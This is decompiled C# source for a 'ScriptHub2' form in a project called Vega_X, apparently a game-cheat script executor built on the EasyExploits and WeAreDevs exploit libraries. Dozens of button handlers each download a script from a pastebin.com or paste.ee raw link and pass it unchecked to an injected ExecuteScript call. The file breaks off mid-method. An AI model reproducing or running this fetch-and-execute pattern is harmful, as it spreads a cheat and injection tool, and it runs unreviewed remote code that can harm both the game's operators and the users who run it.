using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using EasyExploits;
using WeAreDevs_API;

namespace Vega_X
{
	// Token: 0x0200000A RID: 10
	public partial class ScriptHub2 : Form
	{
		// Token: 0x06000100 RID: 256 RVA: 0x0000238E File Offset: 0x0000058E
		public ScriptHub2()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000208A File Offset: 0x0000028A
		private void button1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000102 RID: 258 RVA: 0x00002094 File Offset: 0x00000294
		private void button2_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000103 RID: 259 RVA: 0x00013DB0 File Offset: 0x00011FB0
		private void button3_Click(object sender, EventArgs e)
		{
			base.Hide();
			ScriptHub scriptHub = new ScriptHub();
			scriptHub.Show();
		}

		// Token: 0x06000104 RID: 260 RVA: 0x0000209F File Offset: 0x0000029F
		private void ScriptHub2_Load(object sender, EventArgs e)
		{
			base.TopMost = true;
		}

		// Token: 0x06000105 RID: 261 RVA: 0x000023BC File Offset: 0x000005BC
		private void label1_MouseDown(object sender, MouseEventArgs e)
		{
			this.lastPoint = new Point(e.X, e.Y);
		}

		// Token: 0x06000106 RID: 262 RVA: 0x000023BC File Offset: 0x000005BC
		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			this.lastPoint = new Point(e.X, e.Y);
		}

		// Token: 0x06000107 RID: 263 RVA: 0x00013DD4 File Offset: 0x00011FD4
		private void label1_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left;
			if (flag)
			{
				base.Left += e.X - this.lastPoint.X;
				base.Top += e.Y - this.lastPoint.Y;
			}
		}

		// Token: 0x06000108 RID: 264 RVA: 0x00013DD4 File Offset: 0x00011FD4
		private void panel1_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left;
			if (flag)
			{
				base.Left += e.X - this.lastPoint.X;
				base.Top += e.Y - this.lastPoint.Y;
			}
		}

		// Token: 0x06000109 RID: 265 RVA: 0x00013E38 File Offset: 0x00012038
		private void button93_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/MtRWaGAt");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600010A RID: 266 RVA: 0x00013E68 File Offset: 0x00012068
		private void button92_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/kAZ6wZRk");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00013E98 File Offset: 0x00012098
		private void button91_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/brZVArpB");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600010C RID: 268 RVA: 0x00013E98 File Offset: 0x00012098
		private void button90_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/brZVArpB");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600010D RID: 269 RVA: 0x00013EC8 File Offset: 0x000120C8
		private void button89_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/F6sdeFzi");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600010E RID: 270 RVA: 0x00013EF8 File Offset: 0x000120F8
		private void button21_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/DFQt4x4y");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600010F RID: 271 RVA: 0x00013F28 File Offset: 0x00012128
		private void button88_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/8qjwJzWp");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000110 RID: 272 RVA: 0x00013F28 File Offset: 0x00012128
		private void button5_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/8qjwJzWp");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000111 RID: 273 RVA: 0x00013F58 File Offset: 0x00012158
		private void button6_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/7BK0zSnP");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000112 RID: 274 RVA: 0x00013F88 File Offset: 0x00012188
		private void button20_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/pDEp2TEL");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000113 RID: 275 RVA: 0x00013FB8 File Offset: 0x000121B8
		private void button19_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/U1G4bpxT");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00013FE8 File Offset: 0x000121E8
		private void button18_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/HyEm5Mnn");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000115 RID: 277 RVA: 0x00014018 File Offset: 0x00012218
		private void button17_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/gvexZC6A");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000116 RID: 278 RVA: 0x00014048 File Offset: 0x00012248
		private void button16_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/n03ZWbX5");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000117 RID: 279 RVA: 0x00014078 File Offset: 0x00012278
		private void button15_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/GP3q41DC");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000118 RID: 280 RVA: 0x000140A8 File Offset: 0x000122A8
		private void button14_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/Stk8iRpX");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000119 RID: 281 RVA: 0x000140D8 File Offset: 0x000122D8
		private void button13_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/ZMYqBJCG");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600011A RID: 282 RVA: 0x00014108 File Offset: 0x00012308
		private void button12_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/i4tXbjBY");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600011B RID: 283 RVA: 0x00014138 File Offset: 0x00012338
		private void button11_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/fZr4TT6T");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600011C RID: 284 RVA: 0x00014168 File Offset: 0x00012368
		private void button10_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/vWi4ZKYE");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600011D RID: 285 RVA: 0x00014198 File Offset: 0x00012398
		private void button9_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/WEwW1hrY");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600011E RID: 286 RVA: 0x000141C8 File Offset: 0x000123C8
		private void button8_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/9PiGSf6R");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600011F RID: 287 RVA: 0x000141F8 File Offset: 0x000123F8
		private void button7_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/npkadTm8");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000120 RID: 288 RVA: 0x00014228 File Offset: 0x00012428
		private void button4_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/JG1ALHEt");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000121 RID: 289 RVA: 0x00014258 File Offset: 0x00012458
		private void button29_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/PqQhVM3k");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000122 RID: 290 RVA: 0x00014288 File Offset: 0x00012488
		private void button27_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/ayX664qv");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000123 RID: 291 RVA: 0x000142B8 File Offset: 0x000124B8
		private void button28_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/Nqbb0554");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000124 RID: 292 RVA: 0x000142E8 File Offset: 0x000124E8
		private void button26_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/gNHTqHhZ");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000125 RID: 293 RVA: 0x00014318 File Offset: 0x00012518
		private void button25_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/qPALUQ2w");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00014348 File Offset: 0x00012548
		private void button24_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/GVpBbqWv");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000127 RID: 295 RVA: 0x00014378 File Offset: 0x00012578
		private void button23_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/kz1Et0kG");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000128 RID: 296 RVA: 0x000143A8 File Offset: 0x000125A8
		private void button22_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/NVgGkU6g");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000129 RID: 297 RVA: 0x000143D8 File Offset: 0x000125D8
		private void button30_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/sLSCRGsC");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600012A RID: 298 RVA: 0x00014408 File Offset: 0x00012608
		private void button34_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/XQm9RC08");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600012B RID: 299 RVA: 0x00014438 File Offset: 0x00012638
		private void button33_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/SXBwqVdQ");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600012C RID: 300 RVA: 0x00014468 File Offset: 0x00012668
		private void button31_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/AFhCw3P8");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600012D RID: 301 RVA: 0x00014498 File Offset: 0x00012698
		private void button36_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/uiW0hpJV");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600012E RID: 302 RVA: 0x000144C8 File Offset: 0x000126C8
		private void button32_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/ksLM4ERj");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600012F RID: 303 RVA: 0x000144F8 File Offset: 0x000126F8
		private void button37_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/WPzz3GxQ");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000130 RID: 304 RVA: 0x00014528 File Offset: 0x00012728
		private void button35_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/tdYyGdrg");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000131 RID: 305 RVA: 0x00014558 File Offset: 0x00012758
		private void button47_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/Y8JdGB17");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000132 RID: 306 RVA: 0x00014588 File Offset: 0x00012788
		private void button46_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/9qBVcPHq");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000133 RID: 307 RVA: 0x000145B8 File Offset: 0x000127B8
		private void button45_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/C4h2PAjW");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000134 RID: 308 RVA: 0x000145E8 File Offset: 0x000127E8
		private void button44_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/AQAGVVDx");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000135 RID: 309 RVA: 0x00014618 File Offset: 0x00012818
		private void button43_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/CdDw1CUw");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000136 RID: 310 RVA: 0x00014648 File Offset: 0x00012848
		private void button42_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/WrjYDpjZ");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000137 RID: 311 RVA: 0x00014678 File Offset: 0x00012878
		private void button41_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/QWTKEEku");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000138 RID: 312 RVA: 0x000146A8 File Offset: 0x000128A8
		private void button40_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/anCLbYyx");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000139 RID: 313 RVA: 0x000146D8 File Offset: 0x000128D8
		private void button39_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/0SRVMJ3g");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600013A RID: 314 RVA: 0x00014708 File Offset: 0x00012908
		private void button38_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/dU2RRizn");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600013B RID: 315 RVA: 0x00014738 File Offset: 0x00012938
		private void button50_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/uLta4zKD");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600013C RID: 316 RVA: 0x00014768 File Offset: 0x00012968
		private void button52_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/tPBrwqxe");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600013D RID: 317 RVA: 0x00014798 File Offset: 0x00012998
		private void button51_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/gD2y9QpQ");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600013E RID: 318 RVA: 0x000147C8 File Offset: 0x000129C8
		private void button48_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/0sLTRnTL");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600013F RID: 319 RVA: 0x000147F8 File Offset: 0x000129F8
		private void button49_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/GESqdXMh");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000140 RID: 320 RVA: 0x00014828 File Offset: 0x00012A28
		private void button54_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/mmSYPxWr");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000141 RID: 321 RVA: 0x00014858 File Offset: 0x00012A58
		private void button56_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/KL7PdncT");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000142 RID: 322 RVA: 0x00014888 File Offset: 0x00012A88
		private void button55_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/L5Qzsryu");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000143 RID: 323 RVA: 0x000148B8 File Offset: 0x00012AB8
		private void button57_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/YhgCX53P");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000144 RID: 324 RVA: 0x000148E8 File Offset: 0x00012AE8
		private void button53_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/N8rQAX02");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000145 RID: 325 RVA: 0x00014918 File Offset: 0x00012B18
		private void button59_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/38t0NCJN");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000146 RID: 326 RVA: 0x00014948 File Offset: 0x00012B48
		private void button61_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/rzSky5V2");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000147 RID: 327 RVA: 0x00014978 File Offset: 0x00012B78
		private void button60_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/AmLiehYY");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000148 RID: 328 RVA: 0x000149A8 File Offset: 0x00012BA8
		private void button62_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://paste.ee/r/e6dHL/0");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000149 RID: 329 RVA: 0x000149D8 File Offset: 0x00012BD8
		private void button58_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/ahBKsjJ2");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600014A RID: 330 RVA: 0x00014A08 File Offset: 0x00012C08
		private void button75_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/83JJ7ASG");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600014B RID: 331 RVA: 0x00014A38 File Offset: 0x00012C38
		private void button74_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/20hs02bX");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600014C RID: 332 RVA: 0x00014A68 File Offset: 0x00012C68
		private void button73_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/giKPsJPd");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600014D RID: 333 RVA: 0x00014A98 File Offset: 0x00012C98
		private void button72_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/YTgufSPE");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600014E RID: 334 RVA: 0x00014AC8 File Offset: 0x00012CC8
		private void button71_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/a5Syx1q2");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600014F RID: 335 RVA: 0x00014AF8 File Offset: 0x00012CF8
		private void button70_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/Bcr0U8yH");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000150 RID: 336 RVA: 0x00014B28 File Offset: 0x00012D28
		private void button69_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/SPfAgY7h");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000151 RID: 337 RVA: 0x00014B58 File Offset: 0x00012D58
		private void button68_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/1PhkfZiF");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000152 RID: 338 RVA: 0x00014B88 File Offset: 0x00012D88
		private void button67_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/kmqeWYRq");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000153 RID: 339 RVA: 0x00014BB8 File Offset: 0x00012DB8
		private void button66_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/HEdyUsUM");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000154 RID: 340 RVA: 0x00014BE8 File Offset: 0x00012DE8
		private void button65_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/Xijw6r4Z");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000155 RID: 341 RVA: 0x00014C18 File Offset: 0x00012E18
		private void button64_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/L2yCYCUE");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000156 RID: 342 RVA: 0x00014C48 File Offset: 0x00012E48
		private void button63_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/W95B2fD9");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000157 RID: 343 RVA: 0x00014C78 File Offset: 0x00012E78
		private void button78_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/zhfD8AiR");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000158 RID: 344 RVA: 0x00014CA8 File Offset: 0x00012EA8
		private void button79_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/DKDJZ2RQ");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000159 RID: 345 RVA: 0x00014CD8 File Offset: 0x00012ED8
		private void button81_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/XWcqDVNG");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600015A RID: 346 RVA: 0x00014D08 File Offset: 0x00012F08
		private void button80_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/kFL5QhXE");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600015B RID: 347 RVA: 0x00014D38 File Offset: 0x00012F38
		private void button77_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/a3HpVbJE");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600015C RID: 348 RVA: 0x00014D68 File Offset: 0x00012F68
		private void button76_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/azi9xfYQ");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600015D RID: 349 RVA: 0x00014D98 File Offset: 0x00012F98
		private void button85_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/PXJnmTeg");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00014DC8 File Offset: 0x00012FC8
		private void button86_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/WbUsjpG8");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600015F RID: 351 RVA: 0x00014DF8 File Offset: 0x00012FF8
		private void button87_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/B7ZecPEr");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000160 RID: 352 RVA: 0x00014E28 File Offset: 0x00013028
		private void button83_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/ZHmzeFwN");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000161 RID: 353 RVA: 0x00014E58 File Offset: 0x00013058
		private void button84_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/ZJ95tBHE");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000162 RID: 354 RVA: 0x00014E88 File Offset: 0x00013088
		private void button82_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/NVf0Rja2");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000163 RID: 355 RVA: 0x0000208A File Offset: 0x0000028A
		private void button1_Click_1(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000164 RID: 356 RVA: 0x0000A3A4 File Offset: 0x000085A4
		private void button94_Click(object sender, EventArgs e)
		{
			base.Hide();
			ScriptHub3 scriptHub = new ScriptHub3();
			scriptHub.Show();
		}

		// Token: 0x06000165 RID: 357 RVA: 0x00014EB8 File Offset: 0x000130B8
		private void button109_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/LvWwQiDk");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000166 RID: 358 RVA: 0x00014EE8 File Offset: 0x000130E8
		private void button108_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/mvNegXuS");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000167 RID: 359 RVA: 0x00014F18 File Offset: 0x00013118
		private void button107_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/ZxeknPzV");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000168 RID: 360 RVA: 0x00014F48 File Offset: 0x00013148
		private void button106_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/w99VdFL6");
			this.module.ExecuteScript(script);
		}

		// Token: 0x06000169 RID: 361 RVA: 0x00014F78 File Offset: 0x00013178
		private void button105_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/QAW7c3pK");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600016A RID: 362 RVA: 0x00014FA8 File Offset: 0x000131A8
		private void button104_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/Pek7fnEA");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600016B RID: 363 RVA: 0x00014FD8 File Offset: 0x000131D8
		private void button103_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/WEkw8Jmg");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600016C RID: 364 RVA: 0x00015008 File Offset: 0x00013208
		private void button101_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/VZfMP9mk");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600016D RID: 365 RVA: 0x00015038 File Offset: 0x00013238
		private void button100_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string script = webClient.DownloadString("https://pastebin.com/raw/ZSCyKavt");
			this.module.ExecuteScript(script);
		}

		// Token: 0x0600016E RID: 366 RVA: 0x00002087 File Offset: 0x00000287
		private void label9_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600016F RID: 367 RVA: 0x00015068 File Offset: 0x00013268
		private void button99_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
